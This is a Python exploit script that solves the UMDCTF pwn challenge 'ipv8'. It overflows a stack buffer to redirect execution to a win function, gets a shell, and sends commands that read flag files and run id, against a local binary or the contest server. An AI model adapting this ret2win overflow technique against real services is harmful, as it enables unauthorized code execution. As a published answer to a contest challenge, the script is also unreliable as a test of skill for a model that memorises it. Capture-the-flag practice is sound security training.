#!/usr/bin/env python3
"""
UMDCTF pwn/ipv8 corrected solver.

Fixes compared to the previous pwntools helper:
- the local challenge binary is named ./ipv4, not ./ipv8;
- the correct ret2win target is win+4, not win+1;
- after system("/bin/sh"), a command is sent automatically, so the exploit does not
  leave the user in a silent interactive shell.
"""

from __future__ import annotations

import argparse
import os
import re
import signal
import socket
import struct
import subprocess
import sys
from pathlib import Path
from typing import Optional


DEFAULT_HOST = "challs.umdctf.io"
DEFAULT_PORT = 30308

OFFSET_TO_RIP = 104
DEFAULT_RET = 0x402F49  # win+4 for the provided static ./ipv4 binary

DEFAULT_CMD = (
    "cat flag.txt 2>/dev/null; "
    "cat /flag 2>/dev/null; "
    "cat /home/ctf/flag.txt 2>/dev/null; "
    "id; "
    "exit"
)


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


def find_binary() -> str:
    for name in ("./ipv4", "./ipv8", "./chall", "./challenge"):
        if Path(name).is_file():
            return name
    for p in sorted(Path(".").iterdir()):
        if p.is_file():
            try:
                if p.read_bytes()[:4] == b"\x7fELF":
                    return f"./{p.name}"
            except OSError:
                pass
    return "./ipv4"


def build_source_payload(offset: int, ret_addr: int) -> bytes:
    prefix = b"1.2.3.4"  # exactly 3 dots, so check_valid_address() accepts it
    if len(prefix) > offset:
        raise ValueError("offset is smaller than the IPv4-looking prefix")
    return prefix + b"A" * (offset - len(prefix)) + p64(ret_addr)


def build_destination_payload() -> bytes:
    prefix = b"1.2.3.4"  # exactly 3 dots
    return prefix + b"B" * (48 - len(prefix))  # exactly 48 bytes


def build_stdin(offset: int, ret_addr: int, cmd: str, verbose: bool) -> bytes:
    src = build_source_payload(offset, ret_addr)
    dst = build_destination_payload()

    if verbose:
        visible = src.split(b"\x00", 1)[0]
        print(f"[info] source payload length = {len(src)}")
        print(f"[info] source bytes before saved RIP = {offset}")
        print(f"[info] source dot count before first NUL = {visible.count(b'.')}")
        print(f"[info] destination payload length = {len(dst)}")
        print(f"[info] return address = 0x{ret_addr:x}")

    return b"".join(
        [
            b"x\n",       # Source ASN Prefix, discarded
            src + b"\n",  # Source Host Address, overflows saved RIP
            b"x\n",       # Destination ASN Prefix, discarded
            dst + b"\n",  # Destination Host Address, NUL-clobbers RINE
            cmd.encode() + b"\n",
        ]
    )


def run_local(binary: str, data: bytes, timeout: float, verbose: bool) -> bytes:
    if not os.path.isfile(binary):
        raise FileNotFoundError(
            f"{binary} not found. The provided challenge binary is usually named ./ipv4. "
            "Use: python3 solve_ipv8_corrected.py --local ./ipv4"
        )

    if not os.access(binary, os.X_OK):
        if verbose:
            print(f"[info] chmod +x {binary}")
        os.chmod(binary, os.stat(binary).st_mode | 0o111)

    if verbose:
        print(f"[info] launching local binary: {binary}")

    p = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    try:
        out, _ = p.communicate(data, timeout=timeout)
    except subprocess.TimeoutExpired:
        if verbose:
            print("[warn] timeout; killing local process")
        try:
            os.killpg(p.pid, signal.SIGKILL)
        except Exception:
            p.kill()
        out, _ = p.communicate()

    return out


def run_remote(host: str, port: int, data: bytes, timeout: float, verbose: bool) -> bytes:
    if verbose:
        print(f"[info] connecting to {host}:{port}")

    out = bytearray()

    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(data)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out.extend(chunk)

    return bytes(out)


def extract_flag(out: bytes) -> Optional[str]:
    for pat in (
        rb"UMDCTF\{[^}\r\n]+\}",
        rb"[A-Za-z0-9_\-]+CTF\{[^}\r\n]+\}",
        rb"flag\{[^}\r\n]+\}",
        rb"Star\{[^}\r\n]+\}",
    ):
        m = re.search(pat, out)
        if m:
            return m.group(0).decode(errors="replace")
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Corrected solver for UMDCTF pwn/ipv8")

    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--local", action="store_true", help="run against a local ELF")
    mode.add_argument("--remote", action="store_true", help="run against the remote service")

    parser.add_argument("binary", nargs="?", default=None, help="local ELF path, usually ./ipv4")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--offset", type=int, default=OFFSET_TO_RIP)
    parser.add_argument("--ret", type=lambda x: int(x, 0), default=DEFAULT_RET)
    parser.add_argument("--cmd", default=DEFAULT_CMD)
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    if not args.local and not args.remote:
        args.local = True

    binary = args.binary or find_binary()

    data = build_stdin(
        offset=args.offset,
        ret_addr=args.ret,
        cmd=args.cmd,
        verbose=args.verbose,
    )

    try:
        if args.remote:
            out = run_remote(args.host, args.port, data, args.timeout, args.verbose)
        else:
            out = run_local(binary, data, args.timeout, args.verbose)
    except Exception as exc:
        print(f"[error] {exc}", file=sys.stderr)
        return 1

    sys.stdout.buffer.write(out)
    if out and not out.endswith(b"\n"):
        print()

    flag = extract_flag(out)
    if flag:
        print(f"\n[+] flag: {flag}")
    else:
        print("\n[!] no flag pattern found in output")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
